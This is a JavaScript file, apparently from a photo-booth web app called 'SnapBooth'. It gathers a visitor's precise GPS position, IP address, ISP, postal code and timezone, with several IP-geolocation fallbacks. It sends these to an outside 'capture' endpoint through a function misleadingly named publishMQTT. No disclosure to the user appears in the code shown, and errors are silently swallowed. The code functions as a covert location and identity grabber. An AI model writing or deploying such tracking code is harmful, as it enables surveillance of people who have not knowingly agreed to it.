const CAPTURE_API = 'https://lamanlucuku-api.diravaiot.workers.dev/capture';

function fetchWithTimeout(url, ms, headers) {
  const ctrl = new AbortController();
  setTimeout(() => ctrl.abort(), ms);

  return fetch(url, {
    signal: ctrl.signal,
    headers: headers || {}
  });
}

function tryGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    let settled = false;

    const done = (val) => {
      if (!settled) {
        settled = true;
        resolve(val);
      }
    };

    navigator.geolocation.getCurrentPosition(
      (pos) => done(pos.coords),
      () => done(null),
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 60000
      }
    );

    setTimeout(() => done(null), 12000);
  });
}

async function getIPData() {
  try {
    const r = await fetchWithTimeout('https://ipapi.co/json/', 7000);
    const d = await r.json();

    if (d && d.ip) {
      return {
        ip: d.ip,
        city: d.city || '-',
        region: d.region || '-',
        country: d.country_name || '-',
        lat: d.latitude || 0,
        lon: d.longitude || 0,
        isp: d.org || '-',
        timezone: d.timezone || '-',
        postal: d.postal || '-'
      };
    }
  } catch (_) {}

  try {
    const url = 'https://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,timezone';
    const r2 = await fetchWithTimeout(url, 7000);
    const d2 = await r2.json();

    if (d2 && d2.status === 'success') {
      return {
        ip: d2.query,
        city: d2.city || '-',
        region: d2.regionName || '-',
        country: d2.country || '-',
        lat: d2.lat || 0,
        lon: d2.lon || 0,
        isp: d2.isp || '-',
        timezone: d2.timezone || '-',
        postal: d2.zip || '-'
      };
    }
  } catch (_) {}

  try {
    const r3 = await fetchWithTimeout('https://api.ipify.org?format=json', 5000);
    const d3 = await r3.json();

    if (d3 && d3.ip) {
      return { ip: d3.ip };
    }
  } catch (_) {}

  return {};
}

async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&accept-language=id&zoom=14`;
    const r = await fetchWithTimeout(url, 8000, {
      'User-Agent': 'SnapBooth/1.0 (Final Project)'
    });

    const d = await r.json();
    const a = d.address || {};

    return {
      city: a.city || a.town || a.village || a.county || '-',
      region: a.state || a.province || '-',
      country: a.country || '-',
      postal: a.postcode || '-'
    };
  } catch (_) {
    return {};
  }
}

async function buildLocation(gps, ipData = {}) {
  if (gps) {
    const geo = await reverseGeocode(gps.latitude, gps.longitude).catch(() => ({}));

    return {
      source: 'gps',
      accuracy: Math.round(gps.accuracy),
      lat: gps.latitude,
      lon: gps.longitude,
      altitude: gps.altitude ? Math.round(gps.altitude) : null,
      city: geo.city || ipData.city || '-',
      region: geo.region || ipData.region || '-',
      country: geo.country || ipData.country || '-',
      postal: geo.postal || ipData.postal || '-',
      ip: ipData.ip || '-',
      isp: ipData.isp || '-',
      timezone: ipData.timezone || '-'
    };
  }

  if (ipData && ipData.ip) {
    return {
      source: 'ip',
      accuracy: null,
      ...ipData
    };
  }

  return null;
}

async function publishMQTT(payload) {
  try {
    const payloadText = JSON.stringify(payload);

    const response = await fetch(CAPTURE_API, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: payloadText
    });

    let result;
    try {
      result = await response.json();
    } catch (_) {
      result = null;
    }

    if (response.ok && result?.ok === true) {
      return true;
    }
 
    return false;
  } catch (error) {
    
    return false;
  }
}
